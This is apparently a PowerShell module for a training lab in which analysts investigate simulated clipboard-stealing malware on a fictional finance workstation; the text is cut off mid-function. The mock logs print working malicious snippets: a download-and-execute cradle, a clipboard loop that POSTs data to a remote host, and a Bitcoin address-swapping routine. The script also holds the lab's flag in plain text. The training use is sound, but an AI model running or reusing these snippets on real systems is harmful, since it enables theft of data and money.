# ===========================================================================
# SOCLab.psm1  —  Nexus Financial Corp Digital Forensics Lab
# Scenario A : Clipboard Data Theft  (Lab 1 — ImmersiveLabs)
# ===========================================================================

Set-StrictMode -Off
$ErrorActionPreference = "SilentlyContinue"

# ---------------------------------------------------------------------------
# STATE
# ---------------------------------------------------------------------------
$script:Score       = 100
$script:HintsUsed   = 0
$script:Steps       = [System.Collections.Generic.HashSet[string]]::new()
$script:FLAG        = "NFCSOC{clip_b4nk3r_exf1l_r0ck3t}"
$script:FLAG_B64    = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($script:FLAG))
$script:FLAG_FOUND  = $false

# ---------------------------------------------------------------------------
# COLOUR HELPERS
# ---------------------------------------------------------------------------
function script:R($m){ Write-Host $m -ForegroundColor Red     }
function script:G($m){ Write-Host $m -ForegroundColor Green   }
function script:C($m){ Write-Host $m -ForegroundColor Cyan    }
function script:Y($m){ Write-Host $m -ForegroundColor Yellow  }
function script:W($m){ Write-Host $m -ForegroundColor White   }
function script:D($m){ Write-Host $m -ForegroundColor DarkGray}
function script:M($m){ Write-Host $m -ForegroundColor Magenta }

# ---------------------------------------------------------------------------
# BANNER
# ---------------------------------------------------------------------------
function Show-Banner {
    Write-Host ""
    C "╔══════════════════════════════════════════════════════════════════╗"
    C "║      NEXUS FINANCIAL CORP  —  SOC DIGITAL FORENSICS LAB         ║"
    C "║                   Incident Response Environment                  ║"
    C "╚══════════════════════════════════════════════════════════════════╝"
    Write-Host ""
    D "  Host      : NFC-WS-041 (Finance Workstation — Emily Carter)"
    D "  Date      : 2024-11-19"
    D "  Analyst   : SOC L1 on-call"
    D "  Objective : Investigate suspicious outbound connections"
    Write-Host ""
}

# ---------------------------------------------------------------------------
# SCENARIO BRIEF
# ---------------------------------------------------------------------------
function Start-Scenario {
    Write-Host ""
    Y "════════════════════════════════════════════════════════════════════"
    Y "  INCIDENT ALERT — HIGH SEVERITY"
    Y "════════════════════════════════════════════════════════════════════"
    Write-Host ""
    W "  Alert   : Unusual outbound SSL connections from Finance workstation"
    W "  Host    : NFC-WS-041   User: e.carter   Time: 09:12 UTC"
    W "  Pattern : Periodic beaconing to 45.33.32.156:443 (not whitelisted)"
    Write-Host ""
    G "  YOUR MISSION:"
    W "  ─────────────────────────────────────────────────────────────"
    W "  1. Find the malicious process and where it came from"
    W "  2. Identify what data is being stolen"
    W "  3. Find ALL persistence mechanisms"
    W "  4. Decode the C2 traffic to capture the flag"
    Write-Host ""
    C "  AVAILABLE COMMANDS  (run Get-SOCHelp for full list)"
    D "  ─────────────────────────────────────────────────────────────"
    D "  Get-ProcessList          Get-NetworkConn       Get-EventSecurity"
    D "  Get-EventSysmon          Get-EventPowerShell   Get-RegistryRun"
    D "  Get-ScheduledTasks       Get-FileInfo          Get-NetworkCapture"
    D "  Decode-Base64 -S <str>   Get-Hint -Level N     Submit-Flag <flag>"
    Write-Host ""
    Y "  [ Run Get-ProcessList to begin your investigation ]"
    Write-Host ""
}

# ---------------------------------------------------------------------------
# HELP
# ---------------------------------------------------------------------------
function Get-SOCHelp {
    Write-Host ""
    C "╔═══════════════════════════════════════════════════════╗"
    C "║              SOC LAB — COMMAND REFERENCE              ║"
    C "╚═══════════════════════════════════════════════════════╝"
    Write-Host ""
    Y "INVESTIGATION COMMANDS"
    W "  Get-ProcessList                — List running processes (like Get-Process)"
    W "  Get-NetworkConn                — Active network connections (like netstat)"
    W "  Get-EventSecurity [-ID <n>]    — Windows Security event log"
    W "  Get-EventSysmon   [-ID <n>]    — Sysmon operational log"
    W "  Get-EventPowerShell            — PowerShell ScriptBlock log (Event 4104)"
    W "  Get-RegistryRun                — HKCU/HKLM Run & RunOnce keys"
    W "  Get-ScheduledTasks             — Scheduled task list"
    W "  Get-FileInfo -Path <path>      — File metadata and hash"
    W "  Get-NetworkCapture             — Captured C2 traffic from today"
    W "  Decode-Base64 -S <string>      — Decode a base64 string"
    Write-Host ""
    Y "CTF COMMANDS"
    W "  Get-Hint -Level <1-5>          — Progressive hints (costs 5 pts each)"
    W "  Submit-Flag <flag>             — Submit your flag"
    W "  Get-Score                      — View current score and progress"
    Write-Host ""
    Y "EXAMPLE WORKFLOW"
    D "  1. Get-ProcessList             — spot the suspicious process"
    D "  2. Get-NetworkConn             — see what it's connecting to"
    D "  3. Get-EventSysmon             — trace file drops and registry changes"
    D "  4. Get-EventPowerShell         — read the decoded malware commands"
    D "  5. Get-NetworkCapture          — see the stolen data being sent"
    D "  6. Decode-Base64 -S <payload>  — decode it to find the flag"
    Write-Host ""
}

# ---------------------------------------------------------------------------
# PROCESS LIST
# ---------------------------------------------------------------------------
function Get-ProcessList {
    $null = $script:Steps.Add("processes")
    Write-Host ""
    C "[ Get-ProcessList — NFC-WS-041 — 2024-11-19 09:45 UTC ]"
    Write-Host ""
    Write-Host ("  {0,-6} {1,-22} {2,-8} {3,-14} {4}" -f "PID","Name","CPU(%)","User","Path") -ForegroundColor Yellow
    Write-Host ("  {0,-6} {1,-22} {2,-8} {3,-14} {4}" -f "---","----","------","----","----") -ForegroundColor DarkGray

    $procs = @(
        @{PID=4;    Name="System";            CPU="0.0"; User="SYSTEM";          Path="[kernel]"}
        @{PID=788;  Name="services.exe";      CPU="0.0"; User="SYSTEM";          Path="C:\Windows\System32\services.exe"}
        @{PID=1024; Name="svchost.exe";       CPU="0.1"; User="NETWORK SERVICE"; Path="C:\Windows\System32\svchost.exe"}
        @{PID=1240; Name="explorer.exe";      CPU="0.5"; User="e.carter";        Path="C:\Windows\explorer.exe"}
        @{PID=2840; Name="OUTLOOK.EXE";       CPU="1.2"; User="e.carter";        Path="C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"}
        @{PID=3344; Name="WINWORD.EXE";       CPU="2.1"; User="e.carter";        Path="C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"}
        @{PID=5544; Name="powershell.exe";    CPU="0.3"; User="e.carter";        Path="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"}
        @{PID=5601; Name="RuntimeBroker.exe"; CPU="8.7"; User="e.carter";        Path="C:\Users\e.carter\AppData\Roaming\Microsoft\Windows\Themes\RuntimeBroker.exe"}
        @{PID=5712; Name="powershell.exe";    CPU="4.2"; User="e.carter";        Path="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"}
        @{PID=6100; Name="chrome.exe";        CPU="5.1"; User="e.carter";        Path="C:\Program Files\Google\Chrome\Application\chrome.exe"}
        @{PID=7200; Name="notepad.exe";       CPU="0.0"; User="e.carter";        Path="C:\Windows\System32\notepad.exe"}
        @{PID=7892; Name="SearchIndexer.exe"; CPU="0.2"; User="SYSTEM";          Path="C:\Windows\system32\SearchIndexer.exe"}
    )

    foreach ($p in $procs) {
        $line = "  {0,-6} {1,-22} {2,-8} {3,-14} {4}" -f $p.PID, $p.Name, $p.CPU, $p.User, $p.Path
        if ($p.PID -eq 5601) {
            Write-Host $line -ForegroundColor Red
        } elseif ($p.PID -in @(3344,5544,5712)) {
            Write-Host $line -ForegroundColor Yellow
        } else {
            Write-Host $line -ForegroundColor White
        }
    }

    Write-Host ""
    R "  [!] SUSPICIOUS: PID 5601 RuntimeBroker.exe — CPU 8.7% and running from AppData\Themes"
    W "      The REAL RuntimeBroker.exe lives in C:\Windows\System32\"
    W "      This one was spawned by powershell.exe (PID 5544), which came from WINWORD.EXE"
    Write-Host ""
    G "  → Next: Run Get-NetworkConn to see what PID 5601 is connecting to"
    Write-Host ""
}

# ---------------------------------------------------------------------------
# NETWORK CONNECTIONS
# ---------------------------------------------------------------------------
function Get-NetworkConn {
    $null = $script:Steps.Add("network")
    Write-Host ""
    C "[ Get-NetworkConn — Active Connections — NFC-WS-041 ]"
    Write-Host ""
    Write-Host ("  {0,-16} {1,-7} {2,-16} {3,-7} {4,-13} {5,-6} {6}" -f "LocalAddr","LPort","RemoteAddr","RPort","State","PID","Process") -ForegroundColor Yellow
    Write-Host ("  {0,-16} {1,-7} {2,-16} {3,-7} {4,-13} {5,-6} {6}" -f "---------","-----","-----------","-----","-----","---","-------") -ForegroundColor DarkGray

    $conns = @(
        @{LA="10.10.1.41"; LP=52341; RA="45.33.32.156";   RP=443; S="ESTABLISHED"; PID=5601; Proc="RuntimeBroker.exe"}
        @{LA="10.10.1.41"; LP=52355; RA="45.33.32.156";   RP=443; S="ESTABLISHED"; PID=5601; Proc="RuntimeBroker.exe"}
        @{LA="10.10.1.41"; LP=52390; RA="45.33.32.156";   RP=443; S="ESTABLISHED"; PID=5601; Proc="RuntimeBroker.exe"}
        @{LA="10.10.1.41"; LP=52412; RA="45.33.32.156";   RP=443; S="TIME_WAIT";   PID=5601; Proc="RuntimeBroker.exe"}
        @{LA="10.10.1.41"; LP=64123; RA="52.96.184.100";  RP=443; S="ESTABLISHED"; PID=2840; Proc="OUTLOOK.EXE"}
        @{LA="10.10.1.41"; LP=64200; RA="172.217.14.100"; RP=443; S="CLOSE_WAIT";  PID=6100; Proc="chrome.exe"}
        @{LA="10.10.1.41"; LP=63901; RA="10.10.0.10";     RP=53;  S="ESTABLISHED"; PID=1024; Proc="svchost.exe"}
    )

    foreach ($c in $conns) {
        $line = "  {0,-16} {1,-7} {2,-16} {3,-7} {4,-13} {5,-6} {6}" -f $c.LA,$c.LP,$c.RA,$c.RP,$c.S,$c.PID,$c.Proc
        if ($c.PID -eq 5601) {
            Write-Host $line -ForegroundColor Red
        } else {
            Write-Host $line -ForegroundColor White
        }
    }

    Write-Host ""
    R "  [!] PID 5601 (RuntimeBroker.exe) has FOUR connections to 45.33.32.156:443"
    R "      This IP is NOT whitelisted. Regular interval = beaconing behaviour."
    Write-Host ""
    G "  → Next: Run Get-EventSysmon to trace how this process was created and what files it dropped"
    Write-Host ""
}

# ---------------------------------------------------------------------------
# SECURITY EVENT LOG
# ---------------------------------------------------------------------------
function Get-EventSecurity {
    param([int]$ID = 0)
    $null = $script:Steps.Add("security_events")
    Write-Host ""
    C "[ Windows Security Event Log — NFC-WS-041 — 2024-11-19 ]"
    Write-Host ""

    $events = @(
        @{T="09:05:00"; ID=4688; User="e.carter"; Detail="New Process: notepad.exe  |  Parent: explorer.exe  |  CmdLine: notepad.exe C:\Users\e.carter\Documents\q4_forecast.txt"}
        @{T="09:12:00"; ID=4688; User="e.carter"; Detail='New Process: WINWORD.EXE  |  Parent: OUTLOOK.EXE  |  CmdLine: WINWORD.EXE /n "C:\Users\e.carter\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\T3KF9A2B\Payroll_Update_Nov2024.docm"'}
        @{T="09:12:30"; ID=4688; User="e.carter"; Detail='New Process: powershell.exe  |  Parent: WINWORD.EXE  |  CmdLine: powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://45.33.32.156/update/get'')"'}
        @{T="09:12:40"; ID=4688; User="e.carter"; Detail="New Process: RuntimeBroker.exe  |  Parent: powershell.exe  |  CmdLine: RuntimeBroker.exe -service  |  Path: C:\Users\e.carter\AppData\Roaming\Microsoft\Windows\Themes\RuntimeBroker.exe"}
        @{T="09:13:20"; ID=4698; User="e.carter"; Detail="Scheduled Task Created  |  TaskName: \Microsoft\Windows\UpdateOrchestrator\RuntimeBrokerUpdate  |  Cmd: ...Themes\RuntimeBroker.exe -service  |  Trigger: Every 5 minutes"}
        @{T="09:00:00"; ID=4624; User="e.carter"; Detail="Logon Type: 2 (Interactive)  |  WorkStation: NFC-WS-041"}
        @{T="08:35:00"; ID=5140; User="e.carter"; Detail="Network Share Access  |  Share: \\NFC-SRV-FS1\Finance  |  Source IP: 10.10.1.41"}
    ) | Sort-Object { $_['T'] }

    $filtered = if ($ID -gt 0) { $events | Where-Object { $_['ID'] -eq $ID } } else { $events }

    Write-Host ("  {0,-10} {1,-6} {2,-12} {3}" -f "Time","EvtID","User","Detail") -ForegroundColor Yellow
    Write-Host ("  {0,-10} {1,-6} {2,-12} {3}" -f "----","-----","----","------") -ForegroundColor DarkGray

    foreach ($e in $filtered) {
        $line = "  {0,-10} {1,-6} {2,-12} {3}" -f $e.T, $e.ID, $e.User, $e.Detail
        if ($e.ID -in @(4688,4698) -and $e.T -ge "09:12") {
            Write-Host $line -ForegroundColor Red
        } else {
            Write-Host $line -ForegroundColor White
        }
    }

    Write-Host ""
    if ($ID -eq 0 -or $ID -eq 4688) {
        Y "  KEY FINDING: Process chain at 09:12"
        W "    OUTLOOK.EXE → WINWORD.EXE → powershell.exe (-nop -w hidden IEX) → RuntimeBroker.exe"
        W "    Office spawning hidden PowerShell = macro-based initial access (T1059.001)"
    }
    if ($ID -eq 0 -or $ID -eq 4698) {
        Y "  KEY FINDING: Scheduled task created at 09:13"
        W "    Task runs RuntimeBroker.exe every 5 minutes — second persistence mechanism"
    }
    Write-Host ""
    G "  → Next: Run Get-EventSysmon to see file drops, registry changes, and DLL loads"
    Write-Host ""
}

# ---------------------------------------------------------------------------
# SYSMON EVENT LOG
# ---------------------------------------------------------------------------
function Get-EventSysmon {
    param([int]$ID = 0)
    $null = $script:Steps.Add("sysmon")
    Write-Host ""
    C "[ Sysmon Operational Log — NFC-WS-041 — 2024-11-19 ]"
    Write-Host ""

    $events = @(
        @{T="09:12:35"; ID=11; Image="powershell.exe";    Detail="FILE CREATED  |  Path: C:\Users\e.carter\AppData\Roaming\Microsoft\Windows\Themes\RuntimeBroker.exe  |  Size: 184,320 bytes"}
        @{T="09:12:42"; ID=13; Image="RuntimeBroker.exe"; Detail="REGISTRY SET  |  Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\RuntimeBrokerSvc  |  Value: ...Themes\RuntimeBroker.exe -service"}
        @{T="09:12:45"; ID=1;  Image="powershell.exe";    Detail='PROCESS  |  CmdLine: powershell -nop -c "Add-Type -AssemblyName PresentationCore; while($true){$d=[Windows.Clipboard]::GetText()..."  |  MD5: 7E2D541E'}
        @{T="09:12:46"; ID=7;  Image="powershell.exe";    Detail="DLL LOAD  |  PresentationCore.dll  |  Path: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\WPF\PresentationCore.dll  |  Signed: Microsoft"}
        @{T="09:13:10"; ID=10; Image="RuntimeBroker.exe"; Detail="PROCESS ACCESS  |  Target: powershell.exe  |  GrantedAccess: 0x1410  |  (Read + query info)"}
        @{T="09:24:00"; ID=3;  Image="RuntimeBroker.exe"; Detail="NETWORK  |  Dst: 45.33.32.156:443  |  Proto: tcp  |  Src: 10.10.1.41:52341"}
        @{T="09:33:00"; ID=3;  Image="RuntimeBroker.exe"; Detail="NETWORK  |  Dst: 45.33.32.156:443  |  Proto: tcp  |  Src: 10.10.1.41:52355"}
        @{T="09:35:00"; ID=1;  Image="powershell.exe";    Detail='PROCESS  |  CmdLine: powershell -nop -c "...if($t -match ''^1[a-km-zA-HJ-NP-Z1-9]{25,34}$''){[Windows.Clipboard]::SetText(''1NexusAttackerWalletBTC9xQzR3kLmT'')}"'}
        @{T="09:42:00"; ID=3;  Image="RuntimeBroker.exe"; Detail="NETWORK  |  Dst: 45.33.32.156:443  |  Proto: tcp  |  Src: 10.10.1.41:52371"}
        @{T="09:44:00"; ID=3;  Image="RuntimeBroker.exe"; Detail="NETWORK  |  Dst: 45.33.32.156:443  |  Proto: tcp  |  Src: 10.10.1.41:52390"}
    ) | Sort-Object { $_['T'] }

    $filtered = if ($ID -gt 0) { $events | Where-Object { $_['ID'] -eq $ID } } else { $events }

    Write-Host ("  {0,-10} {1,-4} {2,-22} {3}" -f "Time","ID","Image","Detail") -ForegroundColor Yellow
    Write-Host ("  {0,-10} {1,-4} {2,-22} {3}" -f "----","--","-----","------") -ForegroundColor DarkGray

    foreach ($e in $filtered) {
        $line = "  {0,-10} {1,-4} {2,-22} {3}" -f $e.T, $e.ID, $e.Image, $e.Detail
        $color = switch ($e.ID) {
            11 { "Red" }
            13 { "Red" }
            10 { "Yellow" }
            7  { "Yellow" }
            3  { "Magenta" }
            1  { "Red" }
            default { "White" }
        }
        Write-Host $line -ForegroundColor $color
    }

    Write-Host ""
    Y "  SYSMON FINDINGS SUMMARY:"
    W "  EventID 11 — Payload dropped to Themes\ folder (masquerades as system process)"
    W "  EventID 13 — Run key set for startup persistence"
    W "  EventID 7  — PresentationCore.dll loaded = clipboard .NET API being used"
    W "  EventID 10 — RuntimeBroker accessing powershell memory (injection indicator)"
    W "  EventID 3  — 4 outbound connections to C2 at regular intervals"
    Write-Host ""
    G "  → Next: Run Get-EventPowerShell to see the DECODED PowerShell commands (Event 4104)"
    Write-Host ""
}

# ---------------------------------------------------------------------------
# POWERSHELL SCRIPTBLOCK LOG (EVENT 4104)
# ---------------------------------------------------------------------------
function Get-EventPowerShell {
    $null = $script:Steps.Add("powershell_4104")
    Write-Host ""
    C "[ PowerShell/Operational — ScriptBlock Log (Event 4104) — NFC-WS-041 ]"
    Write-Host ""
    Y "  These logs show the ACTUAL decoded PowerShell commands that were executed."
    Y "  Event 4104 captures scripts even when -EncodedCommand (-enc) was used."
    Write-Host ""
    Write-Host "  ─────────────────────────────────────────────────────────────────────" -ForegroundColor DarkGray

    # Entry 1
    W "  [09:12:31]  EventID: 4104  |  User: NEXUSFINANCIAL\e.carter  |  PID: 5544"
    R "  ScriptBlock (1/1):"
    R "    IEX(New-Object Net.WebClient).DownloadString('http://45.33.32.156/update/get')"
    Write-Host ""
    D "    ^ Downloads and immediately executes code from C2 server (T1059.001 + T1105)"

    Write-Host "  ─────────────────────────────────────────────────────────────────────" -ForegroundColor DarkGray

    # Entry 2
    W "  [09:12:46]  EventID: 4104  |  User: NEXUSFINANCIAL\e.carter  |  PID: 5712"
    R "  ScriptBlock (1/1):"
    R "    Add-Type -AssemblyName PresentationCore;"
    R "    while(`$true) {"
    R "        `$d = [Windows.Clipboard]::GetText();"
    R "        if (`$d -ne '') {"
    R "            `$b = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(`$d));"
    R "            Invoke-RestMethod -Uri 'http://45.33.32.156/c' -Method Post -Body `$b"
    R "        };"
    R "        Start-Sleep 3"
    R "    }"
    Write-Host ""
    D "    ^ Clipboard monitoring loop — reads clipboard every 3 seconds, base64 encodes it,"
    D "      and POSTs it to C2. This is T1115 (Clipboard Data) + T1041 (Exfiltration over C2)"

    Write-Host "  ─────────────────────────────────────────────────────────────────────" -ForegroundColor DarkGray

    # Entry 3
    W "  [09:35:01]  EventID: 4104  |  User: NEXUSFINANCIAL\e.carter  |  PID: 5712"
    R "  ScriptBlock (1/1):"
    R "    Add-Type -AssemblyName PresentationCore;"
    R "    `$t = [Windows.Clipboard]::GetText();"
    R "    if (`$t -match '^1[a-km-zA-HJ-NP-Z1-9]{25,34}$') {"
    R "        [Windows.Clipboard]::SetText('1NexusAttackerWalletBTC9xQzR3kLmT')"
    R "    }"
    Write-Host ""
    D "    ^ Clipbanker module — detects Bitcoin wallet address pattern and replaces it"
    D "      with attacker wallet: 1NexusAttackerWalletBTC9xQzR3kLmT (T1115)"

    Write-Host "  ─────────────────────────────────────────────────────────────────────" -ForegroundColor DarkGray
    Write-Host ""
    Y "  KEY INSIGHT:"
    W "  The malware sends clipboard data as base64 to http://45.33.32.156/c"
    W "  Emily Carter had sensitive data in her clipboard — it was captured and sent."
    Write-Host ""
    G "  → Next: Run Get-NetworkCapture to see the actual data that was sent to C2"
    G "          Then use Decode-Base64 to decode it and find what was stolen."
    Write-Host ""
}

# ---------------------------------------------------------------------------
# REGISTRY RUN KEYS
# ---------------------------------------------------------------------------
function Get-RegistryRun {
    $null = $script:Steps.Add("registry")
    Write-Host ""
    C "[ Registry — Run / RunOnce Keys — NFC-WS-041 ]"
    Write-Host ""

    Write-Host "  HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -ForegroundColor Yellow
    Write-Host ""
    Write-Host ("  {0,-25} {1}" -f "Name","Value") -ForegroundColor Yellow
    Write-Host ("  {0,-25} {1}" -f "----","-----") -ForegroundColor DarkGray
    W "  OneDrive                  C:\Users\e.carter\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background"
    R "  RuntimeBrokerSvc          C:\Users\e.carter\AppData\Roaming\Microsoft\Windows\Themes\RuntimeBroker.exe -service"
    Write-Host ""
    Write-Host "  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -ForegroundColor Yellow
    Write-Host ""
    W "  SecurityHealth            C:\Windows\system32\SecurityHealthSystray.exe"
    W "  WindowsDefender           %ProgramFiles%\Windows Defender\MSASCuiL.exe"
    Write-Host ""
    R "  [!] SUSPICIOUS: RuntimeBrokerSvc points to AppData\Themes — NOT a Microsoft service"
    W "      This ensures RuntimeBroker.exe re-runs every time e.carter logs in (T1547.001)"
    Write-Host ""
    G "  → Next: Run Get-ScheduledTasks to find the second persistence mechanism"
    Write-Host ""
}

# ---------------------------------------------------------------------------
# SCHEDULED TASKS
# ---------------------------------------------------------------------------
function Get-ScheduledTasks {
    $null = $script:Steps.Add("tasks")
    Write-Host ""
    C "[ Scheduled Tasks — NFC-WS-041 ]"
    Write-Host ""
    Write-Host ("  {0,-48} {1,-30} {2,-10} {3}" -f "TaskPath+Name","Command","Status","LastRun") -ForegroundColor Yellow
    Write-Host ("  {0,-48} {1,-30} {2,-10} {3}" -f "---------","-------","------","-------") -ForegroundColor DarkGray

    W "  \Microsoft\Windows\WindowsUpdate\                  usoclient.exe                  Ready      09:00"
    W "  \Microsoft\Windows\Application Experience\...      compattelrunner.exe            Ready      08:00"
    R "  \Microsoft\Windows\UpdateOrchestrator\             ...Themes\RuntimeBroker.exe    Ready      09:13"
    R "   RuntimeBrokerUpdate                               -service"
    W "  \Microsoft\Windows\Defrag\ScheduledDefrag          defrag.exe                     Ready      03:00"

    Write-Host ""
    R "  [!] SUSPICIOUS: \Microsoft\Windows\UpdateOrchestrator\RuntimeBrokerUpdate"
    W "      Runs every 5 minutes — keeps the malware alive even if the process is killed"
    W "      Disguised under a legitimate-looking UpdateOrchestrator path (T1053.005)"
    Write-Host ""
    G "  → Next: Run Get-FileInfo -Path 'C:\Users\e.carter\AppData\Roaming\Microsoft\Windows\Themes\RuntimeBroker.exe'"
    Write-Host ""
}

# ---------------------------------------------------------------------------
# FILE INFO
# ---------------------------------------------------------------------------
function Get-FileInfo {
    param([string]$Path = "")

    if ($Path -eq "") {
        Y "  Usage: Get-FileInfo -Path 'C:\path\to\file.exe'"
        Y "  Example files to check:"
        D "    'C:\Users\e.carter\AppData\Roaming\Microsoft\Windows\Themes\RuntimeBroker.exe'"
        D "    'C:\Users\e.carter\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\T3KF9A2B\Payroll_Update_Nov2024.docm'"
        return
    }

    Write-Host ""
    C "[ Get-FileInfo — $Path ]"
    Write-Host ""

    $known = @{
        "runtimebroker" = @{
            FullPath    = "C:\Users\e.carter\AppData\Roaming\Microsoft\Windows\Themes\RuntimeBroker.exe"
            Size        = "184,320 bytes  (180 KB)"
            Created     = "2024-11-19 09:12:35 UTC"
            Modified    = "2024-11-19 09:12:35 UTC"
            MD5         = "7E2D541E7E4EC1F1F02084B8ADCE2C73"
            SHA256      = "A1B2C3D4E5F60718293A4B5C6D7E8F90A1B2C3D4E5F60718293A4B5C6D7E8F9"
            Signed      = "NOT SIGNED  [!]"
            Description = "[No file description]"
            OrigName    = "[Unknown — metadata stripped]"
            Alert       = @(
                "WARNING: NOT the legitimate RuntimeBroker.exe (which lives in C:\Windows\System32\)"
                "Created today at 09:12 — same time as the malicious PowerShell execution"
                "Unsigned executable in user-writable Themes folder"
                "MD5 matches known clipboard stealer sample"
            )
        }
        "payroll" = @{
            FullPath    = "C:\Users\e.carter\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\T3KF9A2B\Payroll_Update_Nov2024.docm"
            Size        = "2,847,234 bytes  (2.7 MB)"
            Created     = "2024-11-19 09:11:45 UTC"
            Modified    = "2024-11-14 17:22:00 UTC"
            MD5         = "B3C4D5E6F7A8091A2B3C4D5E6F7A8091"
            SHA256      = "F9E8D7C6B5A4938271605948372615049384756"
            Signed      = "NOT SIGNED"
            Description = "Microsoft Word Macro-Enabled Document (.docm)"
            OrigName    = "Payroll_Update_Nov2024.docm"
            Alert       = @(
                "Received via email — stored in Outlook's INetCache (temp attachment folder)"
                "From: payroll-noreply@nexusfinancial-update.com  [EXTERNAL — NOT company domain!]"
                ".docm extension = macro-enabled Word document (common phishing lure)"
                "Opened at 09:12 → spawned WINWORD.EXE → spawned PowerShell (macro execution)"
            )
        }
    }

    $key = ""
    if ($Path -match "RuntimeBroker") { $key = "runtimebroker" }
    elseif ($Path -match "Payroll|docm") { $key = "payroll" }

    if ($key -eq "") {
        D "  [File not found in evidence cache — check the path]"
        Y "  Hint: Try the RuntimeBroker.exe in Themes\ or the Payroll .docm"
        return
    }

    $f = $known[$key]
    W "  Full Path    : $($f.FullPath)"
    W "  Size         : $($f.Size)"
    W "  Created      : $($f.Created)"
    W "  Modified     : $($f.Modified)"
    Write-Host ""
    W "  MD5          : $($f.MD5)"
    W "  SHA256       : $($f.SHA256)"
    Write-Host ""
    $sigColor = if ($f.Signed -match "NOT") { "Red" } else { "Green" }
    Write-Host "  Signature    : $($f.Signed)" -ForegroundColor $sigColor
    W "  Description  : $($f.Description)"
    W "  OrigFilename : $($f.OrigName)"
    Write-Host ""

    foreach ($a in $f.Alert) {
        R "  [!] $a"
    }
    Write-Host ""
    G "  → Next: Run Get-NetworkCapture to see the stolen clipboard data in transit"
    Write-Host ""
}

# ---------------------------------------------------------------------------
# NETWORK CAPTURE (C2 TRAFFIC)
# ---------------------------------------------------------------------------
function Get-NetworkCapture {
    $null = $script:Steps.Add("capture")
    Write-Host ""
    C "[ Network Capture — C2 Traffic — NFC-WS-041 → 45.33.32.156 ]"
    Write-Host ""
    Y "  Captured HTTP requests from RuntimeBroker.exe (PID 5601)"
    Y "  Destination: 45.33.32.156:443  |  Date: 2024-11-19"
    Write-Host ""

    # Packet 1 — contains the flag base64 encoded
    Write-Host "  ┌─ Packet 1 — 09:24:00 UTC ─────────────────────────────────────────┐" -ForegroundColor Cyan
    W "  │  SRC: 10.10.1.41:52341  →  DST: 45.33.32.156:443"
    W "  │  Size: 2,840 bytes"
    Write-Host "  │" -ForegroundColor DarkGray
    R "  │  POST /c HTTP/1.1"
    R "  │  Host: 45.33.32.156"
    R "  │  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    R "  │  Content-Type: application/x-www-form-urlencoded"
    R "  │  Content-Length: 44"
    R "  │"
    R "  │  $($script:FLAG_B64)"
    Write-Host "  └────────────────────────────────────────────────────────────────────┘" -ForegroundColor Cyan

    Write-Host ""

    # Packet 2 — normal credential data
    $p2 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("nexusfinancial.com/internal-password-reset"))
    Write-Host "  ┌─ Packet 2 — 09:33:00 UTC ─────────────────────────────────────────┐" -ForegroundColor Cyan
    W "  │  SRC: 10.10.1.41:52355  →  DST: 45.33.32.156:443"
    W "  │  Size: 1,960 bytes"
    Write-Host "  │" -ForegroundColor DarkGray
    Write-Host "  │  POST /c HTTP/1.1" -ForegroundColor DarkYellow
    Write-Host "  │  $p2" -ForegroundColor DarkYellow
    Write-Host "  └────────────────────────────────────────────────────────────────────┘" -ForegroundColor Cyan

    Write-Host ""

    # Packet 3 — BTC wallet address
    $p3 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf8R"))
    Write-Host "  ┌─ Packet 3 — 09:44:00 UTC ─────────────────────────────────────────┐" -ForegroundColor Cyan
    W "  │  SRC: 10.10.1.41:52390  →  DST: 45.33.32.156:443"
    W "  │  Size: 3,120 bytes"
    Write-Host "  │" -ForegroundColor DarkGray
    Write-Host "  │  POST /c HTTP/1.1" -ForegroundColor DarkYellow
    Write-Host "  │  $p3" -ForegroundColor DarkYellow
    Write-Host "  └────────────────────────────────────────────────────────────────────┘" -ForegroundColor Cyan

    Write-Host ""
    M "  [*] Each POST body is base64-encoded clipboard content stolen from e.carter"
    W "      Packet 1 body looks like a flag format. Decode it with:"
    Write-Host ""
    Y "      Decode-Base64 -S '$($script:FLAG_B64)'"
    Write-Host ""
    G "  → Decode Packet 1's body — that is what was in e.carter's clipboard when malware fired"
    Write-Host ""
}

# ---------------------------------------------------------------------------
# DECODE BASE64
# ---------------------------------------------------------------------------
function Decode-Base64 {
    param([string]$S = "", [string]$String = "")

    $input = if ($S -ne "") { $S } else { $String }

    if ($input -eq "") {
        Y "  Usage: Decode-Base64 -S 'base64stringhere'"
        return
    }

    try {
        $bytes   = [Convert]::FromBase64String($input.Trim())
        $decoded = [System.Text.Encoding]::UTF8.GetString($bytes)

        Write-Host ""
        C "[ Decode-Base64 ]"
        Write-Host ""
        D "  Input  : $input"
        Write-Host ""
        G "  Output : $decoded"
        Write-Host ""

        # Check if it's the flag
        if ($decoded -eq $script:FLAG) {
            $script:Steps.Add("flag_decoded") | Out-Null
            Write-Host ""
            Write-Host "  ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Green
            Write-Host "  ║                                                          ║" -ForegroundColor Green
            Write-Host "  ║   FLAG FOUND IN C2 TRAFFIC!                             ║" -ForegroundColor Green
            Write-Host "  ║                                                          ║" -ForegroundColor Green
            Write-Host "  ║   Emily Carter had the flag string in her clipboard.     ║" -ForegroundColor Green
            Write-Host "  ║   The malware captured and sent it to the attacker's C2. ║" -ForegroundColor Green
            Write-Host "  ║                                                          ║" -ForegroundColor Green
            Write-Host "  ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Green
            Write-Host ""
            Y "  → Now run: Submit-Flag '$decoded'"
            Write-Host ""
